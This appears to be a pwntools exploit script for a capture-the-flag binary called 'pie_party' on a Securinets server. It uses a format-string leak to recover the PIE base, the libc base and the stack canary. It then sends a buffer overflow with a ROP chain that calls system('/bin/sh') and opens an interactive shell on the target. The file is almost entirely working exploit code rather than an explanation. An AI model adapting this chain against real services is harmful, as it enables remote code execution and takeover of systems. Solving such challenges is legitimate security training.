#!/usr/bin/env python3
# Pwninit template - Edited by M0ngi.
from pwn import *

libc = ELF('./libc.so.6')
exe = ELF("./pie_party_patched")

context.binary = exe

sshc = None
r = None
nc = "nc pwn.ctf.securinets.tn 8998"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')

tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
sendl       = lambda x: r.sendline(tobytes(x))
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))


def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return 'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def main():
    global r
    r = conn()
    
    r.sendline(b'1') # Get Pie
    
    pause()
    r.sendline(b'T.%16$p.%11$p.%23$p.')
    
    r.recvuntil(b'T.')
    
    pie_leak = int(r.recvuntil(b'.')[:-1], 16)
    libc_leak = int(r.recvuntil(b'.')[:-1], 16)
    canary = int(r.recvuntil(b'.')[:-1], 16)
    
    pie_base = pie_leak - 0x21a0
    libc_base = libc_leak - 0x216600
    pop_rdi = pie_base + 0x0000000000001543
    ret = pie_base + 0x000000000000101a
    
    libc.address = libc_base
    
    logh("Pie base", pie_base)
    logh("Libc base", libc_base)
    logh("Canary", canary)
    
    r.sendline("hi")
    
    r.sendline(b"2")
    
    pause()
    payload = b"a"*72
    payload += p64(canary)
    payload += p64(0)
    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))
    payload += p64(ret)
    payload += p64(libc.symbols.system)
    
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

